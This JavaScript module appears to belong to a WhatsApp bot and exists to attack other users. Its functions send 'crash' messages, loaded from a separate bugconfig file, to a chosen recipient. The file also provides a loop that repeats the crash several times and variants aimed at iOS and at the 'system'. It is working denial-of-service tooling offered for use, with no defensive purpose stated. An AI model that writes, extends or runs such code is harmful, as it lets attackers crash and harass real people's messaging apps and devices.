const { bugTexts } = require('./bugconfig')

// Send single crash message
async function sendCrashMessage(sock, jid, type = 'xeontext4') {
  try {
    const crashText = bugTexts[type] || bugTexts.xeontext4
    
    await sock.sendMessage(jid, {
      text: crashText
    })
    console.log(`✅ Bug (${type}) sent to ${jid}`)
    return true
  } catch (error) {
    console.error(`❌ Error sending crash:`, error.message)
    return false
  }
}

// Send repeated crashes
async function sendRepeatedCrash(sock, jid, count = 5, type = 'xeontext4') {
  try {
    for (let i = 0; i < count; i++) {
      await sendCrashMessage(sock, jid, type)
      await new Promise(r => setTimeout(r, 300))
    }
    console.log(`✅ Sent ${count} crash messages to ${jid}`)
    return true
  } catch (error) {
    console.error(`❌ Error in repeated crash:`, error.message)
    return false
  }
}

// Send iOS specific crash
async function sendIOSCrash(sock, jid) {
  return sendCrashMessage(sock, jid, 'xeontext6')
}

// Send system crash
async function sendSystemCrash(sock, jid) {
  return sendCrashMessage(sock, jid, 'xeontext3')
}

module.exports = {
  sendCrashMessage,
  sendRepeatedCrash,
  sendIOSCrash,
  sendSystemCrash,
  bugTexts
}
